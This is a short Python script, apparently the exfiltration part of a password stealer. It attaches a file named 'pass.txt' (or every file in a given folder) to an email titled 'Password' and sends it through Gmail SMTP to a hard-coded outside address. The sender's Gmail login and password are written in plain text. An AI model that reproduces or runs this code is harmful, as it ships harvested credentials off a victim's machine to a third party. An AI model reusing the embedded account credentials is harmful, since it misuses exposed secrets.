import smtplib                                              
import os                                                   

import mimetypes                                            
from email import encoders                                  
from email.mime.base import MIMEBase                        
from email.mime.text import MIMEText                        
from email.mime.image import MIMEImage                      
from email.mime.audio import MIMEAudio                      
from email.mime.multipart import MIMEMultipart              

def send_email(addr_from, password, addr_to, files):                            

    msg_subj = 'Password'
    msg_text = 'Password'
    msg = MIMEMultipart()                                   
    msg['From']    = addr_from                              
    msg['To']      = addr_to                                
    msg['Subject'] = msg_subj                               

    body = msg_text                                         
    msg.attach(MIMEText(body, 'plain'))                     

    process_attachement(msg, files)

    #==========Код зависящий от сервиса==========
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(addr_from, password)
    server.send_message(msg)
    server.quit()
    #============================================

def process_attachement(msg, files):                        
    for f in files:
        if os.path.isfile(f):                               
            attach_file(msg,f)                              
        elif os.path.exists(f):                             
            dir = os.listdir(f)                             
            for file in dir:                                
                attach_file(msg,f+"/"+file)                 

def attach_file(msg, filepath):                             
    filename = os.path.basename(filepath)                   
    ctype, encoding = mimetypes.guess_type(filepath)        
    if ctype is None or encoding is not None:              
        ctype = 'application/octet-stream'                  
    maintype, subtype = ctype.split('/', 1)                 
    if maintype == 'text':                                  
        with open(filepath) as fp:                          
            file = MIMEText(fp.read(), _subtype=subtype)    
            fp.close()                                      
    elif maintype == 'image':                               
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
    elif maintype == 'audio':                               
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
    else:                                                   
        with open(filepath, 'rb') as fp:
            file = MIMEBase(maintype, subtype)              
            file.set_payload(fp.read())                     
            fp.close()
            encoders.encode_base64(file)                    
    file.add_header('Content-Disposition', 'attachment', filename=filename) 
    msg.attach(file)                                        

#=====Настройки=================================
_from = "gd6167714@gmail.com"
_password = "gogo456456"
_to   = "rbnr213@gmail.com"                                
files = ["pass.txt"]                                    
#=============================================

send_email(_from, _password, _to, files)
